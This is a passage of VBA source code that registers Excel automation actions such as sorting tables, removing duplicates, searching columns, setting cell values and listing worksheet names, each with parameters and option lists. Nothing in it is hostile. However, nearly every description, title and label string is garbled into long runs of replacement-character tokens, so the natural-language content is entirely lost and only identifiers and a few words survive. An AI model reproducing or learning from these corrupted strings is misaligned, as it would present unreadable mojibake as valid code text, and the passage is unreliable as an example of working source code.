            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|. (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|) / |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "FirstCell", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "CleanType", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("ClearContents", "Clear", "DeleteCells", "DeleteColumns", "DeleteRows"), "ClearContents"
    End With
    
    
    With AAs.AddAction(fc_Workbook, "CreateTableHeader", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With
    
    With AAs.AddAction(fc_Workbook, "SearchInColumn", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Column", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5"), "1"
        .AddParameter "LookAt", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ActionName1", aps_RuntimeList, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ActionSets"
        .AddParameter "ActionName2", aps_RuntimeList, "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ActionSets"
        .AddParameter "SheetName", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
    End With
    
    With AAs.AddAction(fc_Workbook, "WorksheetRemoveDuplicates", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: 1,4,6)"
        .AddParameter "Column", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5"), "1"
    End With
    
    With AAs.AddAction(fc_Workbook, "SortTable", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Column", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5"), "1"
        .AddParameter "SortOrder", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Column2", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2", Array("", "1", "2", "3", "4", "5"), ""
        .AddParameter "SortOrder2", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2", Array("|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Column3", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3", Array("", "1", "2", "3", "4", "5"), ""
        .AddParameter "SortOrder3", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3", Array("|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "OutlineShowLevel", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel"
        .AddParameter "Level", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5", "6", "7", "8"), "8"
    End With
    
    With AAs.AddAction(fc_Workbook, "AutoFilter", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel"
    End With
    
    With AAs.AddAction(fc_Workbook, "SetCellValue", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| A1 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, B2 |fffd||fffd||fffd| D12), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| = (|fffd||fffd||fffd||fffd||fffd|), |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| R1C1"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "RangeAddress", aps_Text, "|fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "OutputRow", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| text1|text2|text3) |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SheetName", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)"
        .AddParameter "LastRowColumn", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5"), "1"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| text1|text2|text3)"
    End With
    
    
    With AAs.AddAction(fc_Workbook, "GetWorksheetNames", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "ActiveSheetVarname", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "GetArrayOfHeadersAndValues", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "ColumnFrom", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5", "6", "7", "8"), "1"
        .AddParameter "HeaderMask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "*#.*#.####"), ""
    End With
    
    With AAs.AddAction(fc_Workbook, "FindCells", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|; " & _
            "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| selection - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
